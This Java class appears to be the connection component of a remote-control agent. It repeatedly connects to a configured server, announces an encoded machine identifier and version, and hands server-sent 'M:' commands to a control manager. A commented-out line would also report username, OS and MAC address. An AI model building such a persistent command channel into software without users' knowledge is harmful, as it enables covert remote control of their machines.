package org.anywhere.agent.socket.connection;

import lombok.Getter;
import lombok.Setter;
import org.anywhere.agent.settings.Settings;
import org.anywhere.agent.Agent;
import org.anywhere.agent.utils.computer.Computer;
import org.anywhere.agent.runnable.ExecutorRunnable;
import org.anywhere.agent.socket.SocketManager;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.*;
import java.nio.charset.StandardCharsets;

public class Connection {

    @Getter
    private final Agent agent;
    @Getter
    @Setter
    private boolean connected;
    @Getter
    private final SocketManager socketManager;
    @Getter
    private PrintWriter printWriter;

    public Connection(final Agent agent, final SocketManager socketManager) {
        this.connected = false;
        this.socketManager = socketManager;
        this.agent = agent;
        new ExecutorRunnable(this).start();
    }

    public void connect(final String mode) {
        while (!this.isConnected())
            this.tryToConnect(mode);
    }

    private void tryToConnect(final String mode) {
        final Computer computer = this.agent.getComputer();
        try {
            final Socket socket = new Socket(this.getRealHost(), this.getSocketManager().getPort());
            this.connected = true;
            final PrintWriter printWriter = new PrintWriter(socket.getOutputStream());
            this.printWriter = printWriter;
            printWriter.println("A-SRV:" + new String((this.agent.getEncoderManager().encode(computer.getIdentifier())).getBytes(StandardCharsets.UTF_8)) + ":" + new String((this.agent.getEncoderManager().encode(mode + ":" + Settings.VERSION/* + ":" + computer.getComputer() + ":" + computer.getUsername() + ":" + computer.getOs() + ":" + computer.getMacAddress()*/)).getBytes(StandardCharsets.UTF_8)));
            printWriter.flush();
            final InputStreamReader inputStreamReader = new InputStreamReader(socket.getInputStream());
            final BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
            while (true) {
                try {
                    final String line = bufferedReader.readLine();
                    if ((line == null) || line.equalsIgnoreCase("RESTART")) {
                        this.connected = false;
                        socket.close();
                        return;
                    }
                    if (line.startsWith("M:") && this.agent.getControlManager() != null)
                        this.agent.getControlManager().read(line.split(":")[1], new String((this.agent.getDecoderManager().decode(line.split(":")[2])).getBytes(StandardCharsets.UTF_8)), socket);
                } catch (final SocketException ignored) {
                    this.connected = false;
                    return;
                }
                if (socket.isClosed()) {
                    this.connected = false;
                    return;
                }
            }
        } catch (final IOException ignore) {
            this.connected = false;
        }
    }

    private String getRealHost() {
        final String host = this.getSocketManager().getAddress();
        try {
            return InetAddress.getByName(host).getHostAddress();
        } catch (final UnknownHostException ignore) {
            return host;
        }
    }
}